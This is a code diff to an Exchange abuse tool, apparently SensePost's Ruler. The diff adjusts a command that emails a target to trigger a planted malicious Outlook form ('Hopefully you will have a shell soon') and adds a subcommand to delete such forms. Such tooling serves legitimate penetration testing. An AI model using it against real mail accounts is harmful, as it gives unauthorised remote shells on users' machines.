@@ -524,13 +524,28 @@ func triggerForm(c *cli.Context) error {
 	suffix := c.String("suffix")
 	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
 
+	utils.Debug.Println("Email sent! Hopefully you will have a shell soon.")
 	msgid, err := forms.CreateFormTriggerMessage(suffix, subject, body)
 	if err != nil {
 		return err
 	}
+	utils.Info.Println("Sending email.")
+	if _, err = mapi.SendExistingMessage(folderid, msgid, c.GlobalString("email")); err != nil {
+		return err
+	}
+	utils.Info.Println("Email sent! Hopefully you will have a shell soon.")
+	return nil
+}
 
-	_, err = mapi.SendExistingMessage(folderid, msgid, c.GlobalString("email"))
-	return err
+func deleteForm(c *cli.Context) error {
+	suffix := c.String("suffix")
+	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
+
+	if _, err := forms.DeleteForm(suffix, folderid); err != nil {
+		return err
+	}
+	utils.Info.Println("Form deleted")
+	return nil
 }
 
 func main() {
@@ -955,6 +970,34 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 						err = triggerForm(c)
 						if err != nil {
 							return cli.NewExitError(err, 1)
+						}
+						return nil
+					},
+				}, {
+					Name:  "delete",
+					Usage: "delete an existing form",
+					Flags: []cli.Flag{
+						cli.StringFlag{
+							Name:  "suffix,s",
+							Value: "",
+							Usage: "The suffix used when creating the form. This must be the same as the value used when the form was created.",
+						},
+					},
+					Action: func(c *cli.Context) error {
+						if c.String("suffix") == "" {
+							return cli.NewExitError("The suffix is required. Please use the same value as supplied to the 'add' command. Default is pew", 1)
+						}
+						if len(c.String("suffix")) != 3 {
+							return cli.NewExitError("The suffix is needs to be 3 characters long.", 1)
+						}
+
+						err := connect(c)
+						if err != nil {
+							return cli.NewExitError(err, 1)
+						}
+						err = deleteForm(c)
+						if err != nil {
+							exit(err)
 						}
 						return nil
 					},
